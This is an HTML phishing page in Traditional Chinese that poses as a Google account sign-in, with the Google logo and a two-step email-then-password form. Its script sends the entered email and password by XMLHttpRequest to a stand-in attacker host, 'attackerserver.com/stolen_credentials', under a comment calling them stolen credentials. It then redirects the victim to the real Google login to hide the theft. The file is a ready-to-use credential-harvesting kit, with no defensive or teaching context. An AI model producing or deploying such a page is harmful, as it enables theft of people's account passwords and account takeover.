<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google 帳戶</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 150px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"] {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
        }

        input[type="submit"] {
            padding: 10px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
        }

        input[type="submit"]:hover {
            background-color: #357ae8;
        }

        .forgot-password {
            margin-top: 10px;
            text-align: right;
            font-size: 12px;
        }

        .create-account {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
            color: #757575;
        }

        .create-account a {
            color: #4285f4;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.gstatic.com/images/branding/product/2x/googleg_92dp.png" alt="Google Logo">
        </div>
        <form id="emailForm" action="#">
            <label for="email">輸入您的 Gmail 電子郵件：</label>
            <input type="text" id="email" name="email" placeholder="example@gmail.com"><br>
            <input type="submit" value="下一步">
        </form>

        <form id="passwordForm" action="#" style="display: none;">
            <label for="password">輸入您的密碼：</label>
            <input type="password" id="password" name="password" placeholder="輸入您的密碼"><br>
            <input type="submit" value="登入">
            <div class="forgot-password">
                <a href="#" style="color: #4285f4;">忘記密碼？</a>
            </div>
            <div class="create-account">
                還沒有帳戶？ <a href="#" style="color: #4285f4;">創建帳戶</a>
            </div>
        </form>
    </div>

    <!-- JavaScript to switch between forms -->
    <script>
        document.getElementById("emailForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form submission
            document.getElementById("emailForm").style.display = "none";
            document.getElementById("passwordForm").style.display = "block";
        });

        document.getElementById("passwordForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form submission

            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            // Send stolen credentials to attacker's server (replace URL with attacker's server)
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://attackerserver.com/stolen_credentials", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({email: email, password: password}));

            // Redirect user to real Google login page (replace with actual Google login URL)
            window.location.href = "https://accounts.google.com";
        });
    </script>
</body>
</html>
